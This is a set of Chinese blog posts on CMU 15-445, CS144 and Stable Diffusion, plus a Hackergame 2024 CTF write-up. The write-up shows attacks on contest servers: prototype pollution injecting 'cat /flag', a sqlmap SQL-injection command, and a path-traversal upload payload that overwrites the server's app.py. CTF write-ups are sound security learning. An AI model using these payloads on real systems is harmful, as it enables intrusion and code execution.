#1"},{"content":"本文章主要记录一下我做 CMU 15-445 Project #0 Copy-on-Write Trie (2023 Fall) 以及 HyperLogLog (2024 Fall) 的经历。\n去年本就该完成的 CMU 15-445，但是去年 Homework #1 SQL 和 Project #0 都花费了较多时间。 后来去实习了，就搁置了这门课。\n去年年底还做了 CSAPP 的 lab0 和 lab1，其中 lab1 简直难度爆炸 🤯 以至于我只做了 5 题就停止了。 lab2 bomb 更是看不懂一点。 我的 CSAPP 仓库 在这里。\n相比之下，今年的 Homework #1 SQL 就只有 5 题，关系结构也很简单，两小时就能做完。\n自从上次做完 CS144 之后，接近一年没写 C++ 了，Project #0 就当复健了。 每年 Project #0 的题目都挺有意思的，这次也是抱着好奇心做的。\nLast but certainly not least, 向这门课表达开源的敬意，在本文章以及后续的 CMU 15-445 系列文章中，我不会公开任何解法。\n调试配置 工具链依旧用的是我最喜欢的 llvm+clang+clangd。 IDE 是 vscode，插件 codelldb 和 clangd。\nsettings.json 配置：\n1 2 3 4 5 6 7 8 9 10 11 { \u0026#34;clangd.path\u0026#34;: \u0026#34;clangd-18\u0026#34;, // https://github.com/microsoft/vscode-cmake-tools/issues/139 \u0026#34;cmake.debugConfig\u0026#34;: { \u0026#34;type\u0026#34;: \u0026#34;lldb\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;program\u0026#34;: \u0026#34;${command:cmake.launchTargetPath}\u0026#34;, \u0026#34;args\u0026#34;: [], \u0026#34;cwd\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } 然后在 Cmake 插件栏选择 Configure 配置编译器和编译模式，测试的时候选择对应的 build / debug target 即可。\n不过有个问题，断点时，有的项目如 HyperLogLog 可以正常查看 STL 容器，但是有的项目如 Buffer Pool Manager 就没法正常查看。 看 cmake 里写的 compile option 似乎也是通用的，可能是配置问题或者 codelldb 插件问题。\n看不到容器内容的时候调试起来就很痛苦，但是没法解决这个问题，只能搁置了。 感觉有可能是某个模板没有编译进去\u0026hellip;只能说 C++ 模板就这样了。 记录一下可能相关的 issue: 1\nCopy-On-Write Trie 去年写的了，当时也没记什么笔记，下面是根据代码提交回忆的。\n首先是编译问题，需要跳转到 third_party/backward-cpp/backward.hpp 将 move 改为 std::move。 不过这个问题只在 2023 的项目里出现，在 2024 里没有这个问题。\n项目要求实现一个 Copy-on-Write (CoW) 前缀树。 它的基本原理就是在写入时将需要修改的节点复制一份，并且不影响原来节点的使用，来实现高效并发的数据结构。 这个方法在操作系统、ZFS 等地方比较常用。\n具体来讲。\nPut 时，首先会创建新的根节点，并依次创建新节点到需要更新的节点。\nRemove 时，搜索到需要删除的节点，进行删除，然后依次向上回溯，判断每个途径节点是否为空并且没有其他子节点，进行删除。\n修改后再将旧的根节点替换为新的根节点，这一步是原子的，所以很安全。\n最后再实现一些锁和 sql string function 就完成了。\n讲义里可能讲的有点玄乎，但实际做起来很简单，这里就不过多讲解了。\nHyperLogLog HyperLogLog (HLL) 是一个基于概率模型的数据基数估计算法，常用于网站唯一访客量计算等场景。Redis 就有对它的支持。\n在百亿级别的访问量下，哈希表的维护会引发内存不足、效率低等问题。 HLL 则不直接储存哈希值，而是通过命中概率来反向估计基数，只需要消耗十几个 KB 的内存。\nHLL 的原理就不赘述了，这里就说说我的理解。 举个例子来说，抛 1 次骰子，它为 1 的概率是 1/6，但是抛 6 次，它出现 1 的期望概率就是 100%。 那么反向就可以推导出，我们看到一个骰子点数为 1，那么它很有可能被抛了 6 次，就算不是 6 次，也会在其上下波动。 而抛出次数越多，那么概率估计就无限接近于正确值。 HLL 做的就是这么一件事，它保存的不是每次抛骰子的点数，而是记录某个点数出现了多少次。 只不过它是基于实际场景的哈希分布进行设计的。\n该项目的任务就是实现两种 HyperLogLog 模型，两个都比较简单，下面只讲讲我遇到的一些麻烦。\nTask #1 Task #1 实现一个普通的基于 leftmost 的 HLL。\n这里我写好了后断点才发现 bitset 是以小端序读取数据的，导致重写。 此外还有 -1 * ulong 导致溢出的问题，需要注意一下。\n不清楚它这里使用 bitset 的意义何在。 leftmost 是从左计算，但是用 bitset 转小端序后又变成逆序\u0026hellip;看起来就很别扭。\n另外，前导零计算其实在 c++20 里面实现了 std::countl_zero，不过课程用的是 c++17.\nTask #2 Task #2 实现一个基于 rightmost 和 dense 结构的 HLL。\n这一题就略难点。\n主要是有些细节没有讲清楚，比如：\nComputeCardinality 怎么运用 overflow 的值。 dense 和 overflow 设置的规则是什么（比如说非 0 才设置，或者 max 规则） 那么没办法，只能去看测试用例。\n通过观察 PrestoCase2 这个测试用例可以推理出 dense / overflow 似乎都是无条件覆盖的。 并且基数值特别大，可以推理出在计算 sum 时需要把 overflow 和 dense 进行拼接。 ComputeCardinality 到这里就完成了。\n再观察 PrestoCase1 测试用例可以发现，obj.AddElem(-1); 的前后基数没有变。 断点调试一下，就可以推理出一个比较完整的 overflow / dense 的设置规则：\ndense 不为空，设置 dense overflow 不为空，同时设置 overflow 和 dense \u0026hellip;这下彻底拥抱 TDD 了 🤣\n提交 Project #0 本身比较简单，但是写了接近两天，有点烦，不过能 AC 至少我不会被 asked to withdraw from the course\u0026hellip;😪\n最后在提交的时候发现了 clang-tidy 的问题，照常理来说 vscode clangd 应该是自动对整个项目运行 clang-tidy 的。\n项目没有提供自定义 clang-tidy binary path 选项，那我们就先跑一下它提供的 make check-clang-tidy-p0，报错 Unable to run clang-tidy.，这个在预期之内，因为我们用的是 clang-tidy-18。\n根据报错提示去到 CMakeFiles/check-clang-tidy-p0.dir/build.make:76 改一下 binary 为自定义安装的 clang-tidy-18 再跑一下就可以发现问题：\n1 2 3 4 /home/iyume/workspace/CMU-15-445/.clang-tidy:65:1: error: unknown key \u0026#39;AnalyzeTemporaryDtors\u0026#39; AnalyzeTemporaryDtors: true ^~~~~~~~~~~~~~~~~~~~~ Error parsing /home/iyume/workspace/CMU-15-445/.clang-tidy: Invalid argument 把 .clang-tidy 中 AnalyzeTemporaryDtors: true 这一行删掉就能使用 clang-tidy-18 了。 直接跑会有配置项报错，不过还是可以跑起来的。所以估计是 vscode clangd 插件没有对这个情况做判断，直接挂了。\n","date":"2025-01-11T18:21:47+08:00","permalink":"https://blog.tinyume.com/2025/cmu15445-p0/","title":"CMU 15-445 Project #0"},{"content":"前言 比赛时间：北京时间 2024 年 11 月 02 日 中午 12:00 ～ 11 月 09 日 中午 12:00（共七天）\n当前分数：1750， 总排名：340 / 2460\nAI：0 ， binary：0 ， general：500 ， math：150 ， web：1100\n今年毕业工作了，虽然公司也没什么忙的（甚至上班摸鱼玩了会），但下班过后再打开电脑确实会感觉时间很少。 不过也算是尽力完成了这次比赛，虽然 misc 的几道简单题没做出来很遗憾，但是 hackergame 依然是很有趣的比赛。\n往年比赛 Writeup 2020、2021、2023 可以翻以前的博文（我才发现 hugo 没有 relative markdown 解析，唉果然还是想自己写一个）\n签到 直接点击启动观察到 url http://202.38.93.141:12024/?pass=false。\n改为 http://202.38.93.141:12024/?pass=true 即可拿到 flag。\n喜欢做签到的 CTFer 你们好呀 通过检索得到 USTC NEBULA 战队，在继续检索相关信息可以得到 https://www.nebuu.la/ 这个网站。\n直观看上去就是一个 shell 嘛，先 help 看一下，然后看到有个 env 命令，直接查看就可以收获第一个 flag。\n第二个 flag 也很简单，ls -al 或者 ls and-We-are-Waiting-for-U 都能看到 .flag 文件（后者不知道是不是 bug）。\n猫咪问答（Hackergame 十周年纪念版） 在 Hackergame 2015 比赛开始前一天晚上开展的赛前讲座是在哪个教室举行的？（30 分）\n2015 年就是第二届，而现有的资料都是从 2018 年才有的，搜索引擎对 hackergame 2015 根本没有搜录。\n那么首先去 https://lug.ustc.edu.cn 翻翻可以直接在导航栏看到 信息安全大赛，点开 第二届安全竞赛（存档） 就可以看到答案了。\n众所周知，Hackergame 共约 25 道题目。近五年（不含今年）举办的 Hackergame 中，题目数量最接近这个数字的那一届比赛里有多少人注册参加？（30 分）\n比赛首页 https://hack.lug.ustc.edu.cn/ 就有第六届-第十届的所有新闻稿，里面就写了参赛人数，每个对比一下，最高人数就是 2019 年第六届的 2682 人。\nHackergame 2018 让哪个热门检索词成为了科大图书馆当月热搜第一？（20 分）\n既然是热搜，那首先去 google search trending 看看关联搜索词呗，没有结果，那就只能去看看 2018 年 有什么题目了 ，翻到 猫咪问答 就可以看到答案了。\n在今年的 USENIX Security 学术会议上中国科学技术大学发表了一篇关于电子邮件伪造攻击的论文，在论文中作者提出了 6 种攻击方法，并在多少个电子邮件服务提供商及客户端的组合上进行了实验？（10 分）\n这题是花了时间最长的。\n首先搜索 usenix 可以得到 USENIX 2024 这个网站，但是这个页面数据有点多，不知道从何下手，于是谷歌站点检索 USENIX Security Email Forgery Attacks site:https://www.usenix.org/conference/usenixsecurity24 可以得到 论文列表，其中和 email 关键词相关的论文就只有 这一篇。\n拿到论文后就直接跳到 experiment results 那边，可以看到 16 个电子邮件提供商和 20 个客户端，于是就分别尝试了 16 / 20 / 320 作为答案但是都不行，但是也懒得阅读论文，于是只能在其他题目都做完后进行爆破。\n源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import time import requests URL = \u0026#34;http://202.38.93.141:13030\u0026#34; TOKEN = \u0026#34;\u0026#34; session = requests.session() session.get(URL, params={\u0026#34;token\u0026#34;: TOKEN}) for i in range(1, 1000): print(\u0026#34;testing\u0026#34;, i) response = session.post(URL, data=f\u0026#34;q1=3A204\u0026amp;q2=2682\u0026amp;q3=%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB\u0026amp;q4={i}\u0026amp;q5=6e90b6\u0026amp;q6=1833\u0026#34;, headers={\u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;}) response.raise_for_status() content = response.content.decode(\u0026#34;utf-8\u0026#34;) if content.count(\u0026#34;flag{\u0026#34;) \u0026gt;= 2: print(\u0026#34;found flag\u0026#34;, i, content) time.sleep(0.2) 最终结果是 336，而在论文里也确实能看到 336 combinations，这题感觉出的有点差。\n10 月 18 日 Greg Kroah-Hartman 向 Linux 邮件列表提交的一个 patch 把大量开发者从 MAINTAINERS 文件中移除。这个 patch 被合并进 Linux mainline 的 commit id 是多少？（5 分）\n去 linux kernel 源码找到当天的提交记录就行。\n大语言模型会把输入分解为一个一个的 token 后继续计算，请问这个网页的 HTML 源代码会被 Meta 的 Llama 3 70B 模型的 tokenizer 分解为多少个 token？（5 分）\n搜索 llama 3 70b 就是 这个模型 了，因为我比较熟悉 AI 模型嘛，所以知道 AutoTokenizer 可以直接加载。\n源码如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import transformers import torch import tokenizers html = open(\u0026#34;./test4.html\u0026#34;).read() # model_id = \u0026#34;meta-llama/Meta-Llama-3-70B\u0026#34; model_id = \u0026#34;NousResearch/Meta-Llama-3-70B\u0026#34; # pipeline = transformers.pipeline( # \u0026#34;text-generation\u0026#34;, # model=model_id, # model_kwargs={\u0026#34;torch_dtype\u0026#34;: torch.bfloat16}, # device_map=\u0026#34;auto\u0026#34;, # ) # print(pipeline.tokenizer) tokenizer = transformers.AutoTokenizer.from_pretrained(model_id) tokens = tokenizer.encode(html) print(len(tokens)) # tokenizer = tokenizers.Tokenizer.from_file(\u0026#34;./tokenizer.json\u0026#34;) # tokens = tokenizer.encode(html) # print(len(tokens)) 输出是 1835，而官方 writeup 上似乎是 1834，再减去 BOS token，答案是 1833。 但是可能是因为我的源码直接从 devtools 拷贝下来的，所以可能有点不对。\n这题出的也不怎样，第一点是这个模型下载在 huggingface 上根本申请不到，只能去官网，第二点是这个 html 源码还需要你去把每个答案重新删掉再进一遍，很麻烦。\n比大小王 devtools 看网络请求，可以一次性拿到所有题目，然后看 js submit 提交数据逻辑。\n脚本如下：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 import time import requests URL = \u0026#34;http://202.38.93.141:12122\u0026#34; TOKEN = \u0026#34;\u0026#34; session = requests.session() session.get(URL, params={\u0026#34;token\u0026#34;: TOKEN}) game_response = session.post( f\u0026#34;{URL}/game\u0026#34;, json={}, ) print(game_response.request.headers) print(game_response.status_code) \u0026#34;\u0026#34;\u0026#34; data sample: {\u0026#39;startTime\u0026#39;: 1730558634.07, \u0026#39;values\u0026#39;: [[5, 2], [11, 12], [6, 15], [19, 4], [2, 10], [1, 10], [8, 10], [12, 10], [15, 8], [1, 8], [1, 13], [16, 11], [17, 18], [16, 19], [2, 9], [3, 6], [9, 1], [8, 12], [7, 19], [10, 7], [12, 6], [6, 18], [19, 7], [9, 6], [7, 4], [5, 17], [13, 14], [5, 9], [12, 10], [11, 14], [7, 17], [11, 12], [19, 8], [19, 2], [18, 1], [2, 16], [8, 5], [15, 13], [8, 7], [4, 8], [11, 0], [9, 4], [9, 2], [19, 17], [4, 19], [4, 12], [14, 15], [4, 10], [9, 11], [17, 5], [19, 2], [8, 16], [8, 3], [7, 11], [2, 13], [4, 13], [5, 10], [17, 5], [15, 16], [7, 17], [18, 9], [4, 17], [2, 5], [7, 10], [11, 4], [12, 8], [18, 9], [11, 8], [14, 1], [15, 3], [7, 15], [15, 16], [2, 15], [10, 3], [7, 15], [16, 2], [1, 6], [18, 12], [5, 4], [7, 16], [5, 13], [1, 18], [12, 3], [16, 18], [7, 3], [9, 8], [2, 15], [4, 8], [7, 16], [19, 0], [12, 9], [9, 12], [3, 9], [18, 19], [10, 15], [15, 2], [18, 17], [4, 10], [2, 4], [6, 15]]} \u0026#34;\u0026#34;\u0026#34; game_details = game_response.json() result = [] for value in game_details[\u0026#34;values\u0026#34;]: if value[0] \u0026gt; value[1]: result.append(\u0026#34;\u0026gt;\u0026#34;) else: result.append(\u0026#34;\u0026lt;\u0026#34;) # {\u0026#39;message\u0026#39;: \u0026#39;检测到时空穿越，挑战失败！\u0026#39;} print(\u0026#34;waiting 8s\u0026#34;) time.sleep(8) submit_response = session.post(f\u0026#34;{URL}/submit\u0026#34;, json={\u0026#34;inputs\u0026#34;: result}) print(submit_response.status_code, submit_response.content) print(submit_response.json()) 旅行照片 4.0 题目 1-2\n第一题搜地图完事了，第二题的话我其实早就关注了 LEO 酱，甚至还看了一会 ACG 音乐会直播。\n题目 3-4\n第三题百度搜图搜了很久才找到，三色跑道的公园还挺多的，后来我在 这里 看到了答案。\n第四题也是百度搜图，很轻松就能搜到三峡大坝，然后查下景区就是 坛子岭。\n题目 5-6\n没做出来，盒能力还是太弱了，今年旅行照片能做出两题就勉勉强强了。\nNode.js is Web Scale 一眼原型链污染，比较简单。\n步骤：\n设置 key __proto__.name 和 value cat /flag 访问 https://chal03-6w864ftr.hack-challenge.lug.ustc.edu.cn:8443/execute?cmd=name 然后就自动执行了注入的脚本，拿到 flag。\nPaoluGPT 第一题 比较简单，就是脚本题，遍历每个网页找 flag。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 import time import requests import re URL = \u0026#34;https://chal01-8pbt3mw7.hack-challenge.lug.ustc.edu.cn:8443\u0026#34; TOKEN = \u0026#34;\u0026#34; session = requests.session() session.get(URL, params={\u0026#34;token\u0026#34;: TOKEN}) list_response = session.get(f\u0026#34;{URL}/list\u0026#34;) list_response.raise_for_status() list_html = list_response.content.decode(\u0026#34;utf-8\u0026#34;) links = re.findall(r\u0026#34;/view\\?conversation_id=.{36}\u0026#34;, list_html) print(len(links), \u0026#34;number of link\u0026#34;) flag = \u0026#34;\u0026#34; for link in links: view_response = session.get(f\u0026#34;{URL}{link}\u0026#34;) print(view_response.status_code, link) if \u0026#34;flag\u0026#34; in (content := view_response.content.decode(\u0026#34;utf-8\u0026#34;)): print(\u0026#34;found flag\u0026#34;, link, content) flag = content print(\u0026#34;flag in\u0026#34;, flag) 第二题 就比较复杂了，先审查一下源码可以看到 main.py 这部分：\n1 2 3 4 5 @app.route(\u0026#34;/view\u0026#34;) def view(): conversation_id = request.args.get(\u0026#34;conversation_id\u0026#34;) results = execute_query(f\u0026#34;select title, contents from messages where id = \u0026#39;{conversation_id}\u0026#39;\u0026#34;) return render_template(\u0026#34;view.html\u0026#34;, message=Message(None, results[0], results[1])) 这部分的查询字符串拼接是个很明显的注入点。 于是 sqlmap 启动：\n1 python sqlmap.py -u \u0026#34;https://chal01-8pbt3mw7.hack-challenge.lug.ustc.edu.cn:8443/view?conversation_id=63bb4f9a-e016-4e43-a3bc-865f65a7df74\u0026#34; --method GET -p conversation_id --cookie \u0026#34;\u0026lt;session\u0026gt;\u0026#34; --sql-query \u0026#34;select id from messages where shown = false\u0026#34; --threads 4 这里只记录了最终的 payload，不过这个表结构是需要自己 dump 一下才知道的，这里就省略了。\n惜字如金 3.0 这是一道 math 题，很显然除了第一问，其余的我都没做出来。\n不过第二问我写了个爆破脚本，但是估算了下，单线程爆破需要 45609 天的时间才能完成\u0026hellip;\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 import itertools import time def crc_a(input: bytes) -\u0026gt; int: poly, poly_degree = \u0026#34;AaaaaaAaaaAAaaaaAAAAaaaAAAaAaAAAAaAAAaaAaaAaaAaaA\u0026#34;, 48 assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == \u0026#34;A\u0026#34; flip = sum([\u0026#34;a\u0026#34;, \u0026#34;A\u0026#34;].index(poly[i + 1]) \u0026lt;\u0026lt; i for i in range(poly_degree)) digest = (1 \u0026lt;\u0026lt; poly_degree) - 1 for b in input: digest = digest ^ b for _ in range(8): digest = (digest \u0026gt;\u0026gt; 1) ^ (flip if digest \u0026amp; 1 == 1 else 0) return digest ^ (1 \u0026lt;\u0026lt; poly_degree) - 1 def hash_a(input: bytes) -\u0026gt; bytes: digest = crc_a(input) u2, u1, u0 = 0xCB4ECDFD0A9F, 0xA9DEC1C1B7A3, 0x60C4B0AAB4BF assert (u2, u1, u0) == (223539323800223, 186774198532003, 106397893833919) digest = (digest * (digest * u2 + u1) + u0) % (1 \u0026lt;\u0026lt; 48) return digest.to_bytes(48 // 8, \u0026#34;little\u0026#34;) def crc_b(input: bytes, poly: str) -\u0026gt; int: poly_degree = 48 assert len(poly) == poly_degree + 1 and poly[0] == poly[poly_degree] == \u0026#34;B\u0026#34; flip = sum([\u0026#34;b\u0026#34;, \u0026#34;B\u0026#34;].index(poly[i + 1]) \u0026lt;\u0026lt; i for i in range(poly_degree)) digest = (1 \u0026lt;\u0026lt; poly_degree) - 1 for b in input: digest = digest ^ b for _ in range(8): digest = (digest \u0026gt;\u0026gt; 1) ^ (flip if digest \u0026amp; 1 == 1 else 0) return digest ^ (1 \u0026lt;\u0026lt; poly_degree) - 1 def hash_b(input: bytes, poly: str) -\u0026gt; bytes: digest = crc_b(input, poly) u2, u1, u0 = 0xDBEEAED4CF43, 0xFDFECEBDEED9, 0xB7E85A4E5DCD assert (u2, u1, u0) == (241818181881667, 279270832074457, 202208575380941) digest = (digest * (digest * u2 + u1) + u0) % (1 \u0026lt;\u0026lt; 48) return digest.to_bytes(48 // 8, \u0026#34;little\u0026#34;) if __name__ == \u0026#34;__main__\u0026#34;: my_input = b\u0026#34;xxx\u0026#34; # 140737488355328 times st = time.time() for i, selector in enumerate(itertools.product([0, 1], repeat=47)): poly_center = [\u0026#34;B\u0026#34;] * 47 for poly_index, mask in enumerate(selector): if mask: poly_center[poly_index] = \u0026#34;b\u0026#34; poly = \u0026#34;B\u0026#34; + \u0026#34;\u0026#34;.join(poly_center) + \u0026#34;B\u0026#34; print(i, poly) if i == 100000: print(time.time() - st) exit(0) if hash_a(my_input) == hash_b(my_input, poly): print(\u0026#34;found b ploy\u0026#34;, poly) break LESS 文件查看器在线版 这题作为唯一一道没有解出来的 web 题，同时也只有 3 人完成的题目，就随便讲讲吧。\n看源码审计的时候看到有两处字符串拼接，就以为是路径跨越或者命令注入，但是怎么都注入不进去，比如\n1 txt`echo aaa` 然后确实也就束手无策了。\n最后看到 wp 确实是利用了文件上传和 getshell，虽然没太看明白\u0026hellip;\n禁止内卷 flask\u0026hellip;reload\u0026hellip;file upload\u0026hellip; 很经典的文件上传题。\n目标是上传一个跨路径文件，触发 flask reload 加载你的代码，然后打印 flag。\n题目连网站源码的位置都告诉你了，那么就直接替换掉 app.py 吧。\nPayload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 # 纯手打，不一定完整 GET /submit HTTP1.1 Host: xxx Content-Type: multipart/form-data; boundary=---------------------------403668309233383699842713014961 Cookie: xxx -----------------------------403668309233383699842713014961 Content-Disposition: form-data; name=\u0026#34;file\u0026#34;; filename=\u0026#34;../../../tmp/web/app.py\u0026#34; Content-Type: image/jpeg from flask import Flask, render_template, request, flash, redirect import json import os import traceback import secrets app = Flask(__name__) app.secret_key = secrets.token_urlsafe(64) UPLOAD_DIR = \u0026#34;/tmp/uploads\u0026#34; os.makedirs(UPLOAD_DIR, exist_ok=True) # results is a list try: with open(\u0026#34;results.json\u0026#34;) as f: results = json.load(f) except FileNotFoundError: results = [] with open(\u0026#34;results.json\u0026#34;, \u0026#34;w\u0026#34;) as f: json.dump(results, f) def get_answer(): # scoring with answer # I could change answers anytime so let\u0026#39;s just load it every time with open(\u0026#34;answers.json\u0026#34;) as f: answers = json.load(f) # sanitize answer for idx, i in enumerate(answers): if i \u0026lt; 0: answers[idx] = 0 return answers @app.route(\u0026#34;/my\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def my_index(): return open(\u0026#34;answers.json\u0026#34;, \u0026#34;r\u0026#34;).read() @app.route(\u0026#34;/\u0026#34;, methods=[\u0026#34;GET\u0026#34;]) def index(): return render_template(\u0026#34;index.html\u0026#34;, results=sorted(results)) @app.route(\u0026#34;/submit\u0026#34;, methods=[\u0026#34;POST\u0026#34;]) def submit(): if \u0026#34;file\u0026#34; not in request.files or request.files[\u0026#39;file\u0026#39;].filename == \u0026#34;\u0026#34;: flash(\u0026#34;你忘了上传文件\u0026#34;) return redirect(\u0026#34;/\u0026#34;) file = request.files[\u0026#39;file\u0026#39;] filename = file.filename filepath = os.path.join(UPLOAD_DIR, filename) file.save(filepath) answers = get_answer() try: with open(filepath) as f: user = json.load(f) except json.decoder.JSONDecodeError: flash(\u0026#34;你提交的好像不是 JSON\u0026#34;) return redirect(\u0026#34;/\u0026#34;) try: score = 0 for idx, i in enumerate(answers): score += (i - user[idx]) * (i - user[idx]) except: flash(\u0026#34;分数计算出现错误\u0026#34;) traceback.print_exc() return redirect(\u0026#34;/\u0026#34;) # ok, update results results.append(score) with open(\u0026#34;results.json\u0026#34;, \u0026#34;w\u0026#34;) as f: json.dump(results, f) flash(f\u0026#34;评测成功，你的平方差为 {score}\u0026#34;) return redirect(\u0026#34;/\u0026#34;) -----------------------------403668309233383699842713014961-- 注入完成后，访问 /my 就可以访问到完整的 answers.json 文件内容。其内容是 list of integer，+65 后转 ascii 就可以看到 flag。（我哭死，它甚至把偏移都告诉我了）\n","date":"2024-11-12T21:03:14+08:00","permalink":"https://blog.tinyume.com/2024/hackergame-2024/","title":"Hackergame 2024"},{"content":"介绍 CS 144: Introduction to Computer Networking, 2023 Spring. 是一门讲 TCP/IP 入门的课程，用 C++ 完成 TCP 栈的各个组件，最后组装起来在真实环境测试。\n11 月底愉快地完成了 CS 106L 后开始做 CS 144，耗时大约 3 周，其实和想象中的耗时差不多。 据 wakatime 统计的 codetime 是 65 h，加上阅读 handouts / labs 的时间应该有 100 h +。\n如果 CS 106L 可以给满分 10 分的话，那么 CS 144 只能给到 8 分，理由有：\n新版 minnow 相对于 2020 libsponge 原版删了 TCPConnection，课程难度直接下降一个星级。TCP benchmark 也全没了。 有几个 lab 没有发挥的空间，也有很多细节没讲到，甚至被删掉，下面会具体讲讲。 课程老师有点大病，12 月 16 号左右把仓库 made private 同时关闭了 https://cs144.github.io 课程主页。之前听说他不允许公布个人解法我还能理解，made private 简直莫名其妙。 Labs Lab 0 ByteStream 实现一个简单的 byte 流，主要实现 Writer::push( string data ) 和 Reader::pop( uint64_t len ) 方法。\n这里的 Reader 和 Go 的 read(T\u0026amp; obj, size_t len) 接口不太一样，是根据 peek() 返回的字符串数量来 pop，所以设计的时候 peek 为了效率必须返回 string_view，这里也是一个设计限制了。\n因为刚接触 C++ 不多，所以我尝试写了各种实现，他们的速度对比如下：\nstring impl: ByteStream throughput: 3.95 Gbit/s vector\u0026lt;char\u0026gt; impl: ByteStream throughput: 3.90 Gbit/s queue\u0026lt;char\u0026gt; impl: ByteStream throughput: 0.67 Gbit/s char* impl: ByteStream throughput: 3.00 Gbit/s queue\u0026lt;string\u0026gt; impl: ByteStream throughput: 30.00 Gbit/s 上面的排序也是我的实现顺序。\nqueue\u0026lt;char\u0026gt; 慢的原因是不支持迭代，每次 peek 只能得到一个 char。 我这里写的 char* 实现略显巧妙，思路是初始化 3 * capacity 的大小，然后用几个变量操作滑动窗口。 写 char* 实现时 sanitizer 一直报内存泄漏，花了好多时间解决。以后再也不想要手操指针了 qwq。\n一开始思维定势在了 char 数组类结构，最优也就 4 Gbit/s，后来查了查才得到一些启发用 string 数组类结构。 更新思路后速度一下子提到了 10+ Gbit/s。\n然后在正确思路上进行优化，以下是我的几点优化方法：\nqueue.pop() 相比 vector.erase(vector.begin()) 可以提升 2 Gbit/s 用 string + move 可以提升 3 Gbit/s 用 front_view 相比 string.erase 可以提升 6 Gbit/s 最终可以达到 32 Gbit/s。\nLab 1 Reassembler 被 overlapping 概念坑了，codetime 6 h 才完成。\n实现一个 随机 流重组器。\nTCP 流一般是提前分割好然后发送的，也就是说 substring index 是不会重叠的。 但是重组器实现为了 robustness 会实现为重组任何子字符串，也就是强调 随机 这一概念。 这里 lab 也没讲清楚，搞得我以为 overlapping 是指某个包重发导致的。\n做了很多 test fit 后我才发现我混淆了概念，然后真正的 solution 两个钟就写好了\u0026hellip;而且 10 Gbit/s +。\n具体实现就不细讲了，就一个简单的算法。\nLab 2 Receiver 第一部分是 ISN wrapper 挺简单的。\n第二部分是 Receiver 也挺简单的。\nLab 3 Sender 算是最难的一部分，讲义里面很多细节没讲到，codetime 13 h 才做完。\n建议参照 2020 的讲义来做，里面提到了 test workflow 之类的东西，对 分析 Sender 的工作流程 很重要。\n有以下几个概念是讲义里面没具体讲的：\n没讲清为什么要在 window size != 0 时增加累计重发次数并 back off RTO 原文说在 push 的时候对 window size 0 特殊处理，也没讲清楚，和上一条是关联的 window size 的概念，没讲为什么每次 receive 就需要执行无条件更新 我先对上面这些概念进行解释：\n当且仅当网络繁忙时才进行 RTO back off，而 window size = 0 时代表 receiver 忙于处理数据 当且仅当发送队列没有任何 byte 并且 window size = 0 时才需要假装 window size = 1，旨在发送一条 不为空 的消息促使 receiver 回复 ack 无条件更新 window size 是一个提前设计好的行为，因为课程作者认为 window size 表明的就是 Sender 的发送队列容量，不给你有别的想法 这个 lab 还有一些过度设计的行为和 test case，下面也讲讲。\nwindow size 那里我认为 ackno + window size - pushed byte count 可以得到精确值。 我第一次做的时候是这么写的，但是卡在了 send_extra 一些莫名其妙的测试上。 继续写的话应该可以过测试，但是代码太丑了就重写了。\n还有就是 tick 那里旨在计时第一个发出的包然后重发。 其实只要在 tick 时判断一下有没有 outstanding segment 再增加计时，收到 ack new receipt of data 再重置， 就可以保证计时是精确的。 事实上我就是这么实现的可以通过 tick 所有测试。\n总而言之，Sender 这块的讲义里面没讲明白原理和细节，只讲流程，莫名其妙，根本没有发挥空间。\nLab 4 Network Interface 实现 ARP 请求和回复、IPv4 包封装和帧交换，简单。\nARP 的设计那里，我对课程作者的要求写法存疑，代码测试要求每次 ARP Request/Response 都带上自己的 Hardware address / ip address 其实可以没必要。\n有一点坑的是 2023 的讲义里删了很多东西，我是配合 2020 的讲义看的。\nLab 5 Router 实现 Route table 和最长前缀匹配，不涉及路由算法 bellman-ford、BGP、OSPF 之类的，简单。\n课程里没讲要更新 checksum，简直狗屎，就看着它莫名其妙的错误信息发呆。后来我看其他人代码才知道。\nLab 6 All together 用课程给的 endtoend 程序启动 server 和 client。\n原理大概类似于 frp 吧，tun 我也不懂。网络栈还是博大精深的，课程的 TCP 只是其中一点点。\n末尾 总体上来说，如果能走在正确的路径上，那么课程是比较轻松的，也具有很大的教学意义。 并没有特别批判的意思，课程就如开头所说 8 / 10 分。\nhttps://github.com/iyume/Stanford-CS144（直接 public，无所谓了）\n","date":"2023-12-22T16:14:21+08:00","permalink":"https://blog.tinyume.com/2023/cs144/","title":"CS 144 TCP"},{"content":"Preface 新笔记本暗影精灵 9 锐龙版自从 6 月多到手后，换了两次系统 —— 换到 win10 发现驱动没有 win10 支持所以又换了回去 win11。 到了 9 月多时，想着拿这 8g 显卡跑点啥，正好又对 Stable diffusion 感兴趣，于是研究了几天源码，跑了几天训练效果对比。 最终结果还是不尽人意，数据集不全是一方面的问题，还有我的 8g 显卡不支持我对模型继续深入研究了。\n原本 9 月底炼的差不多时就想着写一篇文章介绍一下 Stable diffusion，但是不知道为什么忘了（转头像转的）。\n此文章旨在用阐述我对 Stable diffusion 源码和架构的一些理解，以及对于 “为什么我炼不出波奇酱？” 这个问题的解答。\n脚本 文章用的是 diffusers 